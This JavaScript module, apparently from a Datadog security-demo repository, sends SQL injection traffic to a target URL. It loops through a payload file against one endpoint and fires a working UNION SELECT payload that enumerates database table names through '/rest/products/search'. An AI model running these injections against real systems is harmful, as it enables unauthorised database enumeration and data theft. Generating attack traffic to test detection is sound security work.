// Unless explicitly stated otherwise all files in this repository are licensed under the Apache 2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/) Copyright 2023 Datadog, Inc.

const  ora = require('ora')
const chalk = require('chalk');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request')
const fs = require('fs');

const threshold = 100;

async function basic1(targetURL){

    const spinner = ora('Running basic unsuccessful sql injection attack').start();

    let sql_payloads = fs.readFileSync(__dirname + '/sqli-payloads.txt', {encoding:'utf8'});
        sql_payloads = sql_payloads.split("\n");

    
    for (const payload of sql_payloads) {
        spinner.text = 'Basic SQL Injection: ' + payload;
        await http().get(targetURL + '/api/Quantitys/',{
            "q": payload
            
        })
        await new Promise(r => setTimeout(r, 200));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Basic SQL injection attack - done',
                });
   
}

async function exploit(targetURL){

    const spinner = ora('Running successful sql injection attack').start();

    await new Promise(r => setTimeout(r, 1000));
    payload = "qwert')) UNION SELECT TABLE_NAME, 2, 3,4,5,6,7,8,9 FROM INFORMATION_SCHEMA.TABLES #"

    spinner.text = 'Successful SQL Injection: ' + payload;
    await http().get(targetURL + '/rest/products/search',{
        "q": payload
        
    })
    await new Promise(r => setTimeout(r, 1000));
    spinner.stopAndPersist({
        symbol: logSymbols.success,
        text: 'Successful SQL injection attack - done',
    });
}

module.exports = { basic1, exploit }